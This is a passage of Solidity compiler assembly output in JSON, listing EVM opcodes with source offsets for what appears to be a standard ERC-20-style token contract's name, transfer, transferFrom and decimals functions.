											"end": 4982,
											"name": "DUP1"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "DUP1"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "SWAP1"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "ADD"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "SWAP1"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "SWAP3"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "SWAP2"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "SWAP1"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "POP"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "POP"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "POP"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "PUSH [tag]",
											"value": "134"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "tag",
											"value": "132"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "JUMPDEST"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "MLOAD"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "DUP1"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "DUP3"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "ISZERO"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "ISZERO"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "ISZERO"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "ISZERO"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "DUP2"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "MSTORE"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "ADD"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "SWAP2"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "POP"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "POP"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "MLOAD"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "DUP1"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "SWAP2"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "SUB"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "SWAP1"
										},
										{
											"begin": 4525,
											"end": 4982,
											"name": "RETURN"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "tag",
											"value": "28"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "JUMPDEST"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "135"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "135"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "POP"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "PUSH [tag]",
											"value": "136"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "DUP1"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "137"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "137"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "DUP2"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "ADD"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "SWAP1"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "DUP1"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "DUP1"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "AND"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "SWAP1"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "ADD"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "SWAP1"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "SWAP3"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "SWAP2"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "SWAP1"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "POP"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "POP"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "POP"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "PUSH [tag]",
											"value": "138"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "tag",
											"value": "136"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "JUMPDEST"
										},
										{
											"begin": 1741,
											"end": 2016,
											"name": "STOP"
										},
										{
											"begin": 2092,
											"end": 2253,
											"name": "tag",
											"value": "29"
										},
										{
											"begin": 2092,
											"end": 2253,
											"name": "JUMPDEST"
										},
										{
											"begin": 2092,
											"end": 2253,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "139"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "139"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 2092,
											"end": 2253,
											"name": "POP"
										},
										{
											"begin": 2092,
											"end": 2253,
											"name": "PUSH [tag]",
											"value": "140"
										},
										{
											"begin": 2092,
											"end": 2253,
											"name": "PUSH [tag]",
											"value": "141"
										},
										{
											"begin": 2092,
											"end": 2253,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2092,
											"end": 2253,
											"name": "tag",
											"value": "140"
										},
										{
											"begin": 2092,
											"end": 2253,
											"name": "JUMPDEST"
										},
										{
											"begin": 2092,
											"end": 2253,
											"name": "STOP"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "tag",
											"value": "39"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "JUMPDEST"
										},
										{
											"begin": 707,
											"end": 720,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 740,
											"end": 745,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SLOAD"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP2"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "AND"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "ISZERO"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "MUL"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SUB"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "AND"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DIV"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "ADD"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP2"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DIV"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "MUL"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "ADD"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "MLOAD"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP2"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "ADD"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "MSTORE"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP3"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP2"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP2"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP2"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "MSTORE"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "ADD"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP3"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SLOAD"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP2"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "AND"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "ISZERO"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "MUL"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SUB"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "AND"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DIV"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "ISZERO"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH [tag]",
											"value": "143"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "JUMPI"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "LT"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH [tag]",
											"value": "144"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "JUMPI"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP4"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SLOAD"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DIV"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "MUL"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP4"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "MSTORE"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP2"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "ADD"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP2"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH [tag]",
											"value": "143"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "JUMP"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "tag",
											"value": "144"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "JUMPDEST"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP3"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "ADD"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP2"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "MSTORE"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "KECCAK256"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "tag",
											"value": "145"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "JUMPDEST"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP2"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SLOAD"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP2"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "MSTORE"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "ADD"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "ADD"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP4"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "GT"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH [tag]",
											"value": "145"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "JUMPI"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP3"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SUB"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "AND"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "DUP3"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "ADD"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP2"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "tag",
											"value": "143"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "JUMPDEST"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "POP"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "POP"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "POP"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "POP"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "POP"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "SWAP1"
										},
										{
											"begin": 733,
											"end": 745,
											"name": "POP"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "SWAP1"
										},
										{
											"begin": 670,
											"end": 753,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "tag",
											"value": "47"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "JUMPDEST"
										},
										{
											"begin": 2601,
											"end": 2605,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2618,
											"end": 2654,
											"name": "PUSH [tag]",
											"value": "147"
										},
										{
											"begin": 2627,
											"end": 2637,
											"name": "CALLER"
										},
										{
											"begin": 2639,
											"end": 2646,
											"name": "DUP5"
										},
										{
											"begin": 2648,
											"end": 2653,
											"name": "DUP5"
										},
										{
											"begin": 2618,
											"end": 2626,
											"name": "PUSH [tag]",
											"value": "148"
										},
										{
											"begin": 2618,
											"end": 2654,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2618,
											"end": 2654,
											"name": "tag",
											"value": "147"
										},
										{
											"begin": 2618,
											"end": 2654,
											"name": "JUMPDEST"
										},
										{
											"begin": 2672,
											"end": 2676,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2665,
											"end": 2676,
											"name": "SWAP1"
										},
										{
											"begin": 2665,
											"end": 2676,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP3"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "SWAP2"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "POP"
										},
										{
											"begin": 2536,
											"end": 2684,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "tag",
											"value": "50"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "JUMPDEST"
										},
										{
											"begin": 1603,
											"end": 1610,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1630,
											"end": 1642,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1630,
											"end": 1642,
											"name": "SLOAD"
										},
										{
											"begin": 1623,
											"end": 1642,
											"name": "SWAP1"
										},
										{
											"begin": 1623,
											"end": 1642,
											"name": "POP"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "SWAP1"
										},
										{
											"begin": 1559,
											"end": 1650,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "tag",
											"value": "54"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "JUMPDEST"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "MSTORE"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "DUP1"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "MSTORE"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "KECCAK256"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "SWAP2"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "POP"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "SWAP1"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "POP"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "SLOAD"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "DUP2"
										},
										{
											"begin": 2612,
											"end": 2652,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "tag",
											"value": "58"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "JUMPDEST"
										},
										{
											"begin": 3244,
											"end": 3248,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3261,
											"end": 3297,
											"name": "PUSH [tag]",
											"value": "151"
										},
										{
											"begin": 3271,
											"end": 3277,
											"name": "DUP5"
										},
										{
											"begin": 3279,
											"end": 3288,
											"name": "DUP5"
										},
										{
											"begin": 3290,
											"end": 3296,
											"name": "DUP5"
										},
										{
											"begin": 3261,
											"end": 3270,
											"name": "PUSH [tag]",
											"value": "152"
										},
										{
											"begin": 3261,
											"end": 3297,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3261,
											"end": 3297,
											"name": "tag",
											"value": "151"
										},
										{
											"begin": 3261,
											"end": 3297,
											"name": "JUMPDEST"
										},
										{
											"begin": 3308,
											"end": 3381,
											"name": "PUSH [tag]",
											"value": "153"
										},
										{
											"begin": 3317,
											"end": 3323,
											"name": "DUP5"
										},
										{
											"begin": 3325,
											"end": 3335,
											"name": "CALLER"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "PUSH [tag]",
											"value": "154"
										},
										{
											"begin": 3373,
											"end": 3379,
											"name": "DUP6"
										},
										{
											"begin": 3337,
											"end": 3348,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3349,
											"end": 3355,
											"name": "DUP11"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "AND"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "AND"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "DUP2"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "MSTORE"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "ADD"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "SWAP1"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "DUP2"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "MSTORE"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "ADD"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3337,
											"end": 3356,
											"name": "KECCAK256"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3357,
											"end": 3367,
											"name": "CALLER"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "AND"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "AND"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "DUP2"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "MSTORE"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "ADD"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "SWAP1"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "DUP2"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "MSTORE"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "ADD"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "KECCAK256"
										},
										{
											"begin": 3337,
											"end": 3368,
											"name": "SLOAD"
										},
										{
											"begin": 3337,
											"end": 3372,
											"name": "PUSH [tag]",
											"value": "155"
										},
										{
											"begin": 3337,
											"end": 3372,
											"name": "SWAP1"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "SWAP2"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "SWAP1"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "AND"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "tag",
											"value": "154"
										},
										{
											"begin": 3337,
											"end": 3380,
											"name": "JUMPDEST"
										},
										{
											"begin": 3308,
											"end": 3316,
											"name": "PUSH [tag]",
											"value": "148"
										},
										{
											"begin": 3308,
											"end": 3381,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3308,
											"end": 3381,
											"name": "tag",
											"value": "153"
										},
										{
											"begin": 3308,
											"end": 3381,
											"name": "JUMPDEST"
										},
										{
											"begin": 3399,
											"end": 3403,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 3392,
											"end": 3403,
											"name": "SWAP1"
										},
										{
											"begin": 3392,
											"end": 3403,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP4"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "SWAP3"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "POP"
										},
										{
											"begin": 3155,
											"end": 3411,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "tag",
											"value": "61"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "JUMPDEST"
										},
										{
											"begin": 1563,
											"end": 1568,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1588,
											"end": 1597,
											"name": "PUSH",
											"value": "7"
										},
										{
											"begin": 1588,
											"end": 1597,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1588,
											"end": 1597,
											"name": "SWAP1"
										},
										{
											"begin": 1588,
											"end": 1597,
											"name": "SLOAD"
										},
										{
											"begin": 1588,
											"end": 1597,
											"name": "SWAP1"
										},
										{
											"begin": 1588,
											"end": 1597,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 1588,
											"end": 1597,
											"name": "EXP"
										},
										{
											"begin": 1588,
											"end": 1597,
											"name": "SWAP1"
										},
										{
											"begin": 1588,
											"end": 1597,
											"name": "DIV"
										},
										{
											"begin": 1588,
											"end": 1597,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 1588,
											"end": 1597,
											"name": "AND"
										},
										{
											"begin": 1581,
											"end": 1597,
											"name": "SWAP1"
										},
										{
											"begin": 1581,
											"end": 1597,
											"name": "POP"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "SWAP1"
										},
										{
											"begin": 1522,
											"end": 1605,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "tag",
											"value": "65"
										},
										{
											"begin": 3820,
											"end": 4026,
											"name": "JUMPDEST"
										},
										{
											"begin": 3900,
											"end": 3904,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3917,
											"end": 3996,
											"name": "PUSH [tag]",
											"value": "158"
										},
										{
											"begin": 3926,
											"end": 3936,
											"name": "CALLER"
										},
										{
											"begin": 3938,
											"end": 3945,
											"name": "DUP5"
										},
										{
											"begin": 3947,
											"end": 3995,
											"name": "PUSH [tag]",
											"value": "159"
										},
										{
											"begin": 3984,
											"end": 3994,
											"name": "DUP6"
										},
										{
											"begin": 3947,
											"end": 3958,
											"name": "PUSH",
											"value": "3"
										},
										{
